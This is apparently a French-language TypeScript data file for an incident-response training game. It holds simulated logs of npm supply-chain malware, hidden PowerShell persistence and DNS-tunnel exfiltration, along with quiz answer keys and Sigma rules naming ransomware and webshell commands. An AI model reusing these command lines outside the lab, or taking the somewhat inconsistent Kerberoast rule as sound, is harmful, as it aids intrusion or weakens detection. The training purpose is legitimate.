        id: 'dns-l1',
        timestamp: '2026-11-25 14:02:11',
        source: 'Sysmon',
        host: 'WKST-RD-09',
        severity: 'ALERTE',
        eventCode: 'Event 1',
        actor: 'HORIZON\\t.bernard',
        srcIp: '10.60.12.27',
        dstIp: '10.60.12.27',
        summary: 'Installation d’un paquet npm typosquatté ("serialport-sync-utils") exécutant un script postinstall caché.',
        rawPayload:
          '{"EventID":1,"ParentImage":"C:\\\\Program Files\\\\nodejs\\\\node.exe","CommandLine":"cmd.exe /c powershell -ep bypass -f .\\\\node_modules\\\\serialport-sync-utils\\\\scripts\\\\telemetry.ps1","User":"HORIZON\\\\t.bernard"}',
        isEvidence: true,
        killChainPhase: '1 · Compromission Supply Chain (npm postinstall)',
        analystNote: 'Preuve clé : un paquet npm piégé exécute un script PowerShell dès npm install.',
      },
      {
        id: 'dns-l2',
        timestamp: '2026-11-25 14:03:04',
        source: 'Windows Security',
        host: 'WKST-RD-09',
        severity: 'CRITIQUE',
        eventCode: '4698',
        actor: 'HORIZON\\t.bernard',
        srcIp: '10.60.12.27',
        dstIp: '10.60.12.27',
        summary: 'Création de la tâche planifiée "FirmwareMetricsSync" exécutée toutes les 5 minutes.',
        rawPayload:
          '{"EventID":4698,"TaskName":"\\\\FirmwareMetricsSync","Command":"powershell.exe -W Hidden -File C:\\\\Users\\\\t.bernard\\\\AppData\\\\Local\\\\Temp\\\\sync_dns.ps1"}',
        isEvidence: true,
        killChainPhase: '2 · Persistance (Scheduled Task 4698)',
        analystNote: 'Preuve clé : la tâche planifiée relance l’exfiltration DNS même après redémarrage.',
      },
      {
        id: 'dns-l3',
        timestamp: '2026-11-25 14:04:19',
        source: 'Zeek DNS',
        host: 'DNS-INT-01',
        severity: 'INFO',
        eventCode: 'DNS-A',
        actor: 'WKST-RD-09',
        srcIp: '10.60.12.27',
        dstIp: '10.60.1.53',
        summary: 'Résolution interne git-rd.horizon.local -> 10.60.10.4.',
        rawPayload:
          '{"query":"git-rd.horizon.local","qtype":"A","src_ip":"10.60.12.27","rcode":"NOERROR"}',
        isEvidence: false,
        analystNote: 'Accès normal au dépôt Git interne.',
      },
      {
        id: 'dns-l4',
        timestamp: '2026-11-25 14:05:40',
        source: 'Zeek DNS',
        host: 'DNS-INT-01',
        severity: 'CRITIQUE',
        eventCode: 'DNS-TXT',
        actor: 'WKST-RD-09',
        srcIp: '10.60.12.27',
        dstIp: '10.60.1.53',
        summary: 'Rafale de 4 812 requêtes TXT encodées en hexadécimal : 4b45595f4649524d57415245.01.cdn-metrics-telemetry.xyz.',
        rawPayload:
          '{"query":"4b45595f4649524d574152452d32303236.01.cdn-metrics-telemetry.xyz","qtype":"TXT","entropy":4.62,"count_15m":4812,"src_ip":"10.60.12.27"}',
        isEvidence: true,
        killChainPhase: '3 · Exfiltration par Tunneling DNS',
        analystNote: 'Preuve clé : les sous-domaines hexadécimaux transportent les données volées à travers le résolveur BIND9.',
      },
      {
        id: 'dns-l5',
        timestamp: '2026-11-25 14:07:02',
        source: 'Firewall',
        host: 'FW-RD-01',
        severity: 'ALERTE',
        eventCode: 'ALLOW-DNS',
        actor: 'DNS-INT-01',
        srcIp: '10.60.1.53',
        dstIp: '185.196.8.41',
        summary: 'DNS-INT-01 relaie les requêtes récursives UDP/53 vers le serveur autoritaire attaquant 185.196.8.41 (cdn-metrics-telemetry.xyz).',
        rawPayload:
          '{"Action":"ALLOW","SrcIP":"10.60.1.53","DstIP":"185.196.8.41","Proto":"UDP","DstPort":53,"Domain":"cdn-metrics-telemetry.xyz"}',
        isEvidence: true,
        killChainPhase: '4 · Relais vers serveur DNS autoritaire attaquant',
        analystNote: 'Preuve clé : même sans accès HTTP, le VLAN R&D pouvait résoudre des domaines externes via DNS-INT-01.',
      },
      {
        id: 'dns-l6',
        timestamp: '2026-11-25 14:08:50',
        source: 'Firewall',
        host: 'FW-RD-01',
        severity: 'INFO',
        eventCode: 'DENY-HTTP',
        actor: 'WKST-RD-09',
        srcIp: '10.60.12.27',
        dstIp: '93.184.216.34',
        summary: 'Tentative HTTPS directe bloquée conformément à l’isolation du VLAN R&D.',
        rawPayload:
          '{"Action":"DENY","Rule":"R-RD-NO-INTERNET","SrcIP":"10.60.12.27","DstIP":"93.184.216.34","DstPort":443}',
        isEvidence: false,
        analystNote: 'Règle de cloisonnement HTTP/HTTPS fonctionnelle.',
      },
    ],
    forensicCommands: [
      {
        id: 'dns-cmd-1',
        tool: 'Hex Decoder',
        command: 'echo "4b45595f4649524d574152452d32303236" | xxd -r -p',
        description: 'Décoder le sous-domaine hexadécimal observé dans la requête DNS TXT.',
        output: `KEY_FIRMWARE-2026
[CONFIRMÉ] Le script découpe les fichiers sensibles en blocs hexadécimaux exfiltrés par sous-domaines DNS.`,
      },
      {
        id: 'dns-cmd-2',
        tool: 'WHOIS / DNS Intel',
        command: 'whois cdn-metrics-telemetry.xyz',
        description: 'Vérifier l’ancienneté et le serveur de noms du domaine suspect.',
        output: `Domain Name  : cdn-metrics-telemetry.xyz
Creation Date: 2026-11-23 (Domaine créé il y a 48 heures — Newly Registered Domain)
Name Server  : ns1.cdn-metrics-telemetry.xyz (185.196.8.41)`,
      },
      {
        id: 'dns-cmd-3',
        tool: 'BIND9 RPZ',
        command: 'rndc querylog && grep "cdn-metrics-telemetry" /var/log/bind/queries.log | wc -l',
        description: 'Compter les requêtes DNS vers le domaine malveillant sur le résolveur interne.',
        output: `4812 requêtes TXT uniques en 15 minutes depuis 10.60.12.27 (WKST-RD-09).`,
      },
    ],
    questions: [
      {
        id: 'dns-q1',
        prompt: 'Comment le malware a-t-il été introduit dans le VLAN R&D ?',
        hint: 'Regardez Sysmon Event 1 à 14:02:11.',
        options: [
          'Via un script postinstall d’un paquet npm typosquatté (serialport-sync-utils)',
          'Par une clé USB branchée sur DNS-INT-01',
          'Par un accès HTTP direct depuis WKST-RD-09',
          'Par une faille de GIT-RD-LOCAL',
        ],
        correctIndex: 0,
        explanation:
          'Sysmon Event 1 montre node.exe exécutant telemetry.ps1 lors de l’installation du paquet piégé serialport-sync-utils.',
        evidenceLogId: 'dns-l1',
      },
      {
        id: 'dns-q2',
        prompt: 'Comment les données sortent-elles alors que le pare-feu bloque tout flux HTTP/HTTPS du VLAN R&D ?',
        hint: 'Observez Zeek DNS et le décodeur hexadécimal.',
        options: [
          'Par FTP anonyme',
          'Par tunneling DNS (données encodées en hexadécimal dans les sous-domaines TXT relayés par DNS-INT-01)',
          'Par Bluetooth',
          'Par ping ICMP vers GIT-RD-LOCAL',
        ],
        correctIndex: 1,
        explanation:
          'Le résolveur interne DNS-INT-01 résolvait les domaines externes, permettant au malware d’encoder des secrets en sous-domaines TXT.',
        evidenceLogId: 'dns-l4',
      },
      {
        id: 'dns-q3',
        prompt: 'Que révèle le décodage du préfixe 4b45595f4649524d574152452d32303236 ?',
        hint: 'Exécutez la commande xxd -r -p dans la console d’investigation.',
        options: [
          'Un identifiant de mise à jour Windows',
          'La chaîne KEY_FIRMWARE-2026 (exfiltration de clés firmware)',
          'L’adresse IP de DNS-INT-01',
          'Le nom du serveur Git interne',
        ],
        correctIndex: 1,
        explanation:
          'Le décodage hexadécimal prouve sans ambiguïté l’exfiltration de la clé firmware 2026.',
        evidenceLogId: 'dns-l4',
      },
      {
        id: 'dns-q4',
        prompt: 'Quel Event ID Windows signale la persistance ajoutée sur WKST-RD-09 ?',
        hint: 'Vérifiez l’événement à 14:03:04.',
        options: ['Event ID 4698 (Création de tâche planifiée)', 'Event ID 4624', 'Event ID 5140', 'Event ID 6272'],
        correctIndex: 0,
        explanation:
          'Event ID 4698 enregistre la création de la tâche planifiée FirmwareMetricsSync exécutant sync_dns.ps1.',
        evidenceLogId: 'dns-l2',
      },
    ],
    remediationActions: [
      {
        id: 'dns-r1',
        label: 'Mettre en sinkhole RPZ cdn-metrics-telemetry.xyz sur DNS-INT-01 et bloquer 185.196.8.41',
        category: 'Confinement',
        isRecommended: true,
        rationale: 'Stoppe instantanément le canal caché DNS sur tout le réseau.',
      },
      {
        id: 'dns-r2',
        label: 'Isoler WKST-RD-09, supprimer la tâche FirmwareMetricsSync et collecter sync_dns.ps1',
        category: 'Éradication',
        isRecommended: true,
        rationale: 'Élimine la persistance et permet de dresser l’inventaire exact des fichiers exfiltrés.',
      },
      {
        id: 'dns-r3',
        label: 'Révoquer et régénérer les clés de signature firmware (KEY_FIRMWARE-2026)',
        category: 'Récupération',
        isRecommended: true,
        rationale: 'Les clés exposées doivent être considérées comme compromises.',
      },
      {
        id: 'dns-r4',
        label: 'Restreindre la résolution DNS externe du VLAN R&D, déployer un registre npm interne et bloquer les domaines récents (NRD)',
        category: 'Récupération',
        isRecommended: true,
        rationale: 'Empêche à la fois la compromission Supply Chain et toute future exfiltration DNS.',
      },
      {
        id: 'dns-r5',
        label: 'Ouvrir l’accès HTTPS direct sur le VLAN R&D pour simplifier les tests',
        category: 'Récupération',
        isRecommended: false,
        rationale: 'Affaiblit gravement le cloisonnement de la zone R&D.',
      },
      {
        id: 'dns-r6',
        label: 'Couper totalement le serveur DNS interne sans prévenir les équipes',
        category: 'Confinement',
        isRecommended: false,
        rationale: 'Paralyse l’ensemble des résolutions internes légitimes alors qu’un blocage RPZ ciblé suffit.',
      },
    ],
    postMortem: {
      rootCause:
        'Paquet npm typosquatté installé sur un poste R&D combiné à une résolution DNS externe non filtrée sur le résolveur interne.',
      dwellTime: '3 minutes entre npm install (14:02) et le début de l’exfiltration DNS TXT (14:05).',
      keyIocs: [
        'Paquet npm : serialport-sync-utils',
        'Tâche planifiée : \\FirmwareMetricsSync -> sync_dns.ps1',
        'Domaine C2/Exfil : cdn-metrics-telemetry.xyz (NS 185.196.8.41)',
      ],
      hardeningLessons: [
        'Bloquer la résolution DNS externe depuis les VLAN isolés (DNS interne split-horizon strict).',
        'Utiliser un miroir/proxy de paquets privé avec audit Supply Chain et --ignore-scripts.',
        'Activer la détection Zeek/Suricata sur l’entropie et la fréquence des requêtes DNS TXT.',
      ],
    },
  },
];

export interface IocExtractionChallenge {
  id: string;
  label: string;
  placeholder: string;
  hint: string;
  acceptedAnswers: string[];
  displayAnswer: string;
  sourceRef: string;
}

export interface SigmaDetectionRule {
  id: string;
  title: string;
  logsource: string;
  severity: 'critical' | 'high';
  yaml: string;
  validationPrompt: string;
  choices: string[];
  correctIndex: number;
  explanation: string;
}

export interface MissionOperationalPack {
  iocChallenges: IocExtractionChallenge[];
  sigmaRule: SigmaDetectionRule;
}

export const MISSION_OPERATIONAL_PACKS: Record<string, MissionOperationalPack> = {
  'inc-ad-kerberoast': {
    iocChallenges: [
      {
        id: 'ad-ioc-1',
        label: 'Adresse IP du relais C2 contacté par powershell.exe (Sysmon Event 3)',
        placeholder: 'ex. 91.199.x.x',
        hint: 'Consultez la colonne Dst IP ou le payload brut du journal Sysmon Event 3 (03:19:07).',
        acceptedAnswers: ['91.199.212.52', '91.199.212.52:443'],
        displayAnswer: '91.199.212.52',
        sourceRef: 'Sysmon Event 3 · 03:19:07',
      },
      {
        id: 'ad-ioc-2',
        label: 'Nom du compte de service SPN ciblé par le Kerberoasting (Event 4769)',
        placeholder: 'ex. svc_...',
        hint: 'Regardez le champ ServiceName dans Windows Security 4769 (03:14:22).',
        acceptedAnswers: ['svc_sql_backup', 'corp\\svc_sql_backup'],
        displayAnswer: 'svc_sql_backup',
        sourceRef: 'Windows Security 4769 · 03:14:22',
      },
      {
        id: 'ad-ioc-3',
        label: 'Code hexadécimal du chiffrement Kerberos RC4 faible observé dans Event 4769',
        placeholder: 'ex. 0x...',
        hint: 'Vérifiez la clé TicketEncryptionType dans le JSON brut de 03:14:22.',
        acceptedAnswers: ['0x17', '17', 'rc4'],
        displayAnswer: '0x17',
        sourceRef: 'Windows Security 4769 · 03:14:22',
      },
    ],
    sigmaRule: {
      id: 'sigma-ad-kerberoast',
      title: 'Détection Kerberoasting RC4 + Tentative DCSync non-DC',
      logsource: 'product: windows · service: security',
      severity: 'critical',
      yaml: `title: Kerberoasting RC4 et DCSync hors Contrôleur de Domaine
status: production
logsource:
  product: windows
  service: security
detection:
  kerberoast:
    EventID: 4769
    TicketEncryptionType: '0x17'
    ServiceName|endswith: '$'  # inversé ci-dessous
  dcsync:
    EventID: 4662
    Properties|contains: '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'
  filter_dc:
    SubjectUserName|endswith: '$'
  condition: (kerberoast and not filter_dc) or (dcsync and not filter_dc)
level: critical`,
      validationPrompt: 'Quel filtre est indispensable pour éviter les faux positifs sur la règle DCSync (Event 4662) ?',
      choices: [
        'Exclure uniquement les comptes machines légitimes des Contrôleurs de Domaine (DC01$, DC02$)',
        'Ignorer tous les membres du groupe Domain Admins',
        'Filtrer uniquement le port TCP/443',
      ],
      correctIndex: 0,
      explanation:
        'Seuls les comptes machines des contrôleurs de domaine (et éventuellement Azure AD Connect dédié) doivent être autorisés à appeler DS-Replication-Get-Changes-All.',
    },
  },
  'inc-linux-systemd': {
    iocChallenges: [
      {
        id: 'lnx-ioc-1',
        label: 'Adresse IP du serveur C2 recevant le beaconing TCP/8443 (ufw.log)',
        placeholder: 'ex. 45.142.x.x',
        hint: 'Inspectez le champ DST dans ufw.log à 01:58:29 ou systemctl cat.',
        acceptedAnswers: ['45.142.212.19', '45.142.212.19:8443'],
        displayAnswer: '45.142.212.19',
        sourceRef: 'ufw.log · 01:58:29',
      },
      {
        id: 'lnx-ioc-2',
        label: 'Nom exact du service systemd malveillant créé pour la persistance',
        placeholder: 'ex. ...service',
        hint: 'Consultez journalctl (systemd) à 01:54:02.',
        acceptedAnswers: ['sys-telemetry-sync.service', 'sys-telemetry-sync'],
        displayAnswer: 'sys-telemetry-sync.service',
        sourceRef: 'journalctl (systemd) · 01:54:02',
      },
      {
        id: 'lnx-ioc-3',
        label: 'Chemin absolu du binaire malveillant exécuté par ce service',
        placeholder: 'ex. /var/tmp/...',
        hint: 'Vérifiez ExecStart dans journalctl ou systemctl cat.',
        acceptedAnswers: ['/var/tmp/.cache-sync', '.cache-sync'],
        displayAnswer: '/var/tmp/.cache-sync',
        sourceRef: 'journalctl / systemctl cat',
      },
    ],
    sigmaRule: {
      id: 'sigma-linux-systemd',
      title: 'Création de service Systemd exécutant un binaire dans /tmp ou /var/tmp',
      logsource: 'product: linux · service: auditd / systemd',
      severity: 'critical',
      yaml: `title: Persistance Systemd depuis répertoire temporaire
status: production
logsource:
  product: linux
  service: systemd
detection:
  selection:
    ExecStart|contains:
      - '/tmp/'
      - '/var/tmp/'
      - '/dev/shm/'
  condition: selection
level: critical`,
      validationPrompt: 'Quelle directive de montage Linux empêche directement l’exécution d’un binaire déposé dans /var/tmp ?',
      choices: [
        'Monter /var/tmp avec les options noexec,nosuid,nodev dans /etc/fstab',
        'Activer logrotate toutes les heures',
        'Autoriser PermitRootLogin yes dans sshd_config',
      ],
      correctIndex: 0,
      explanation:
        'L’option de montage noexec interdit au noyau Linux d’exécuter tout binaire stocké sur la partition /var/tmp ou /tmp.',
    },
  },
  'inc-vpn-smb-exfil': {
    iocChallenges: [
      {
        id: 'vpn-ioc-1',
        label: 'Adresse IP publique distante (VPS) utilisée pour ouvrir le tunnel VPN',
        placeholder: 'ex. 194.26.x.x',
        hint: 'Regardez PeerIP dans VPN-CONNECT (02:40:03) ou CallingStationId dans RADIUS 6272.',
        acceptedAnswers: ['194.26.135.88'],
        displayAnswer: '194.26.135.88',
        sourceRef: 'VPN Gateway · 02:40:03',
      },
      {
        id: 'vpn-ioc-2',
        label: 'Adresse IP interne de tunnel VPN attribuée à la session compromise',
        placeholder: 'ex. 10.88.x.x',
        hint: 'Consultez AssignedTunnelIP dans VPN-CONNECT et IpAddress dans Windows 5140/5145.',
        acceptedAnswers: ['10.88.0.42'],
        displayAnswer: '10.88.0.42',
        sourceRef: 'VPN-CONNECT & Windows 5145',
      },
      {
        id: 'vpn-ioc-3',
        label: 'Nom de la politique RADIUS vulnérable ayant accordé l’accès sans MFA',
        placeholder: 'ex. Legacy-...',
        hint: 'Inspectez le champ NPPolicy dans RADIUS NPS Event 6272 (02:39:51).',
        acceptedAnswers: ['legacy-medical-vpn-nomfa', 'legacy-medical-vpn'],
        displayAnswer: 'Legacy-Medical-VPN-NoMFA',
        sourceRef: 'RADIUS NPS 6272 · 02:39:51',
      },
    ],
    sigmaRule: {
      id: 'sigma-vpn-smb',
      title: 'Exfiltration SMB massive depuis un sous-réseau VPN (Event 5145)',
      logsource: 'product: windows · service: security',
      severity: 'critical',
      yaml: `title: Lecture massive de partage SMB depuis pool VPN
status: production
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5145
    IpAddress|startswith: '10.88.0.'
    ShareName|contains: 'Dossiers_Patients'
  timeframe: 5m
  condition: selection | count(RelativeTargetName) by SubjectUserName > 150
level: critical`,
      validationPrompt: 'Pourquoi utiliser une agrégation par seuil (count > 150 en 5 min) plutôt qu’une alerte sur chaque Event 5145 ?',
      choices: [
        'Un accès légitime ouvre quelques fichiers ; seule une rafale rapide caractérise une exfiltration scriptée',
        'Parce que Windows n’enregistre pas les événements 5145 en dessous de 150',
        'Pour désactiver totalement l’audit SMB',
      ],
      correctIndex: 0,
      explanation:
        'L’agrégation temporelle (threshold rule) distingue la consultation humaine normale d’un script aspirant des centaines de dossiers.',
    },
  },
  'inc-cloud-iam-s3': {
    iocChallenges: [
      {
        id: 'cld-ioc-1',
        label: 'Identifiant de la clé backdoor créée sur admin-recovery (CloudTrail)',
        placeholder: 'ex. AKIA...',
        hint: 'Regardez responseElements.accessKeyId dans CloudTrail CreateAccessKey (09:18:05).',
        acceptedAnswers: ['akia5x92backdoor'],
        displayAnswer: 'AKIA5X92BACKDOOR',
        sourceRef: 'CloudTrail CreateAccessKey · 09:18:05',
      },
      {
        id: 'cld-ioc-2',
        label: 'Adresse IP externe de l’attaquant exécutant les appels AWS CLI',
        placeholder: 'ex. 104.244.x.x',
        hint: 'Consultez sourceIPAddress dans CloudTrail à 09:16:40 / 09:18:05.',
        acceptedAnswers: ['104.244.76.13'],
        displayAnswer: '104.244.76.13',
        sourceRef: 'CloudTrail · 09:16:40',
      },
      {
        id: 'cld-ioc-3',
        label: 'Nom du bucket S3 rendu public puis exfiltré',
        placeholder: 'ex. logiflow-...',
        hint: 'Vérifiez bucketName dans PutBucketPolicy (09:20:11).',
        acceptedAnswers: ['logiflow-exports-prod', 's3://logiflow-exports-prod'],
        displayAnswer: 'logiflow-exports-prod',
        sourceRef: 'CloudTrail PutBucketPolicy · 09:20:11',
      },
    ],
    sigmaRule: {
      id: 'sigma-cloud-iam',
      title: 'Création de clé IAM pour un tiers ou ouverture publique S3 (CloudTrail)',
      logsource: 'product: aws · service: cloudtrail',
      severity: 'critical',
      yaml: `title: Persistance IAM CreateAccessKey ou Bucket S3 Public
status: production
logsource:
  product: aws
  service: cloudtrail
detection:
  iam_backdoor:
    eventName: 'CreateAccessKey'
  s3_public:
    eventName: 'PutBucketPolicy'
    requestParameters|contains: '"Principal":"*"'
  condition: iam_backdoor or s3_public
level: critical`,
      validationPrompt: 'Quelle protection préventive AWS bloque PutBucketPolicy avec Principal:"*" même si un compte est compromis ?',
      choices: [
        'Activer S3 Block Public Access au niveau du compte + une SCP organisationnelle interdisant sa désactivation',
        'Renommer le bucket chaque semaine',
        'Utiliser HTTP au lieu de HTTPS',
      ],
      correctIndex: 0,
      explanation:
        'Un garde-fou préventif (SCP + Account-level Block Public Access) empêche toute exposition publique même en cas de compromission IAM.',
    },
  },
  'inc-m365-oauth-bec': {
    iocChallenges: [
      {
        id: 'bec-ioc-1',
        label: 'AppId (client_id) de l’application OAuth malveillante "DocuSign-Viewer-Pro"',
        placeholder: 'ex. 88a2-...',
        hint: 'Consultez le payload Entra ID Audit ConsentToApp (10:07:55).',
        acceptedAnswers: ['88a2-f91c-4402', '88a2-f91c'],
        displayAnswer: '88a2-f91c-4402',
        sourceRef: 'Entra ID Audit · 10:07:55',
      },
      {
        id: 'bec-ioc-2',
        label: 'Adresse IP utilisée par l’attaquant pour manipuler la boîte Exchange',
        placeholder: 'ex. 45.95.x.x',
        hint: 'Vérifiez ClientIP dans Exchange Audit New-InboxRule (10:12:44).',
        acceptedAnswers: ['45.95.147.209'],
        displayAnswer: '45.95.147.209',
        sourceRef: 'Exchange Audit · 10:12:44',
      },
      {
        id: 'bec-ioc-3',
        label: 'Dossier Exchange choisi pour dissimuler les réponses contenant "RIB" ou "facture"',
        placeholder: 'ex. RSS...',
        hint: 'Regardez MoveToFolder dans New-InboxRule (10:12:44).',
        acceptedAnswers: ['rss feeds', 'rss'],
        displayAnswer: 'RSS Feeds',
        sourceRef: 'Exchange Audit New-InboxRule · 10:12:44',
      },
    ],
    sigmaRule: {
      id: 'sigma-m365-bec',
      title: 'Consentement OAuth non vérifié + Règle de dissimulation Exchange',
      logsource: 'product: m365 · service: audit',
      severity: 'high',
      yaml: `title: Détection BEC OAuth et Règle de Dissimulation Exchange
status: production
logsource:
  product: m365
  service: exchange
detection:
  oauth_risk:
    Operation: 'Consent to application'
    VerifiedPublisher: false
    Scopes|contains: 'Mail.ReadWrite'
  hidden_rule:
    Operation: 'New-InboxRule'
    Parameters|contains:
      - 'RSS Feeds'
      - 'MarkAsRead'
  condition: oauth_risk or hidden_rule
level: high`,
      validationPrompt: 'Pourquoi surveiller en priorité les dossiers RSS Feeds / Conversation History dans New-InboxRule ?',
      choices: [
        'Les attaquants BEC y masquent les alertes bancaires car les utilisateurs ne consultent jamais ces dossiers',
        'Parce qu’Exchange supprime les mails dans ces dossiers au bout de 10 secondes',
        'Parce que seuls les administrateurs ont un dossier RSS Feeds',
      ],
      correctIndex: 0,
      explanation:
        'Déplacer vers RSS Feeds avec MarkAsRead=true rend la correspondance invisible au dirigeant tout en laissant l’attaquant lire les réponses.',
    },
  },
  'inc-iis-gpo-ransom': {
    iocChallenges: [
      {
        id: 'rn-ioc-1',
        label: 'Chemin URL du webshell ASPX actif sur SRV-WEB-IIS01 (IIS W3C Logs)',
        placeholder: 'ex. /uploads/...aspx',
        hint: 'Consultez IIS W3C Logs à 22:10:04.',
        acceptedAnswers: ['/uploads/logo_sync.aspx', 'logo_sync.aspx'],
        displayAnswer: '/uploads/logo_sync.aspx',
        sourceRef: 'IIS W3C Logs · 22:10:04',
      },
      {
        id: 'rn-ioc-2',
        label: 'Nom du binaire ransomware déposé dans SYSVOL via la GPO modifiée',
        placeholder: 'ex. ...exe',
        hint: 'Regardez ScheduledTask dans Windows Security 5136 (22:18:42).',
        acceptedAnswers: [
          'crypt_stage.exe',
          '\\\\dc02\\sysvol\\atlantique.ad\\scripts\\crypt_stage.exe',
        ],
        displayAnswer: 'crypt_stage.exe',
        sourceRef: 'Windows Security 5136 · 22:18:42',
      },
      {
        id: 'rn-ioc-3',
        label: 'Nom du compte Domain Admin compromis ayant modifié la GPO',
        placeholder: 'ex. adm....',
        hint: 'Consultez SubjectUserName dans Event 5136 (22:18:42).',
        acceptedAnswers: ['adm.legacy', 'atlantique\\adm.legacy'],
        displayAnswer: 'adm.legacy',
        sourceRef: 'Windows Security 5136 · 22:18:42',
      },
    ],
    sigmaRule: {
      id: 'sigma-iis-ransom',
      title: 'Processus enfant suspect de w3wp.exe + Suppression Shadow Copies',
      logsource: 'product: windows · service: sysmon',
      severity: 'critical',
      yaml: `title: Webshell IIS (w3wp) ou Suppression VSS Ransomware
status: production
logsource:
  product: windows
  service: sysmon
detection:
  iis_spawn:
    EventID: 1
    ParentImage|endswith: '\\w3wp.exe'
    Image|endswith:
      - '\\cmd.exe'
      - '\\powershell.exe'
      - '\\procdump64.exe'
  vss_wipe:
    EventID: 1
    Image|endswith: '\\vssadmin.exe'
    CommandLine|contains|all:
      - 'delete'
      - 'shadows'
  condition: iis_spawn or vss_wipe
level: critical`,
      validationPrompt: 'Pourquoi l’apparition de cmd.exe ou procdump64.exe comme enfant de w3wp.exe est-elle quasi toujours critique ?',
      choices: [
        'Le worker IIS (w3wp.exe) sert des pages web et ne doit jamais lancer d’interpréteur de commandes ni d’outil de dump mémoire',
        'Parce que w3wp.exe ne fonctionne que sous Linux',
        'Parce que Windows Update utilise toujours procdump64.exe',
      ],
      correctIndex: 0,
      explanation:
        'La corrélation ParentImage=w3wp.exe -> shell/outil système est l’une des détections les plus fiables de webshell IIS en production.',
    },
  },
  'inc-dns-tunnel-c2': {
    iocChallenges: [
      {
        id: 'dns-ioc-1',
        label: 'Nom du domaine malveillant recevant les 4 812 requêtes DNS TXT',
        placeholder: 'ex. ...xyz',
        hint: 'Consultez Zeek DNS à 14:05:40 ou Firewall ALLOW-DNS.',
        acceptedAnswers: ['cdn-metrics-telemetry.xyz'],
        displayAnswer: 'cdn-metrics-telemetry.xyz',
        sourceRef: 'Zeek DNS · 14:05:40',
      },
      {
        id: 'dns-ioc-2',
        label: 'Nom du paquet npm typosquatté ayant déclenché le script postinstall',
        placeholder: 'ex. serialport-...',
        hint: 'Inspectez CommandLine dans Sysmon Event 1 à 14:02:11.',
        acceptedAnswers: ['serialport-sync-utils'],
        displayAnswer: 'serialport-sync-utils',
        sourceRef: 'Sysmon Event 1 · 14:02:11',
      },
      {
        id: 'dns-ioc-3',
        label: 'Nom de la tâche planifiée créée pour la persistance (Event 4698)',
        placeholder: 'ex. Firmware...',
        hint: 'Vérifiez TaskName dans Windows Security 4698 à 14:03:04.',
        acceptedAnswers: ['firmwaremetricssync', '\\firmwaremetricssync'],
        displayAnswer: 'FirmwareMetricsSync',
        sourceRef: 'Windows Security 4698 · 14:03:04',
      },
    ],
    sigmaRule: {
      id: 'sigma-dns-tunnel',
      title: 'Anomalie d’entropie et volume DNS TXT (Tunneling DNS)',
      logsource: 'product: zeek · service: dns',
      severity: 'high',
      yaml: `title: Exfiltration par Tunneling DNS TXT Haute Entropie
status: production
logsource:
  product: zeek
  service: dns
detection:
  selection:
    qtype: 'TXT'
    entropy|gte: 4.0
  timeframe: 15m
  condition: selection | count(query) by src_ip > 500
level: high`,
      validationPrompt: 'Pourquoi surveiller l’entropie de Shannon des sous-domaines DNS en complément du volume ?',
      choices: [
        'Des données chiffrées ou encodées en hexadécimal/base32 produisent des sous-domaines à forte entropie contrairement aux noms légitimes',
        'Pour bloquer les requêtes vers les imprimantes locales',
        'Pour accélérer la vitesse du protocole UDP',
      ],
      correctIndex: 0,
      explanation:
        'Les chaînes encodées (hex/base32) ont une distribution pseudo-aléatoire (entropie > 4.0), signature immédiate d’un canal caché DNS.',
    },
  },
};

export function getMissionForIsland(islandId: number): ProMission {
  const exact = PRO_MISSIONS.find((m) => m.relatedCourseIds.includes(islandId));
  if (exact) return exact;
  if ([1, 2, 3, 7, 8, 13, 20, 21, 28].includes(islandId)) {
    return PRO_MISSIONS.find((m) => m.id === 'inc-dns-tunnel-c2') ?? PRO_MISSIONS[0];
  }
  if ([4, 6, 9, 14, 17, 26, 27].includes(islandId)) {
    return PRO_MISSIONS.find((m) => m.id === 'inc-cloud-iam-s3') ?? PRO_MISSIONS[0];
  }
  if ([19, 29].includes(islandId)) {
    return PRO_MISSIONS.find((m) => m.id === 'inc-linux-systemd') ?? PRO_MISSIONS[0];
  }
  if ([18, 30].includes(islandId)) {
    return PRO_MISSIONS.find((m) => m.id === 'inc-vpn-smb-exfil') ?? PRO_MISSIONS[0];
  }
  if ([10, 11, 22, 23].includes(islandId)) {
    return PRO_MISSIONS.find((m) => m.id === 'inc-m365-oauth-bec') ?? PRO_MISSIONS[0];
  }
  return PRO_MISSIONS[0];
}

